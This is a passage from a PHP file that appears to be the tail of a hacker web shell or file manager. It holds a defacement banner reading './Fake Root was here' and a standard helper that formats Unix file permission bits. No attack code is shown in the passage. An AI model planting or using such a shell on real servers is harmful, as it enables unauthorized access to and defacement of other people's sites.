<center><br/><font face="Kelly Slab" color="white" style="text-shadow: 0 0 20px blue, 0 0 5px blue, 0 0 7px blue, 0 0 45px blue; font-weight:bold: blue; font-size:30px">./Fake Root was here</center>
</body>
</html></div>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
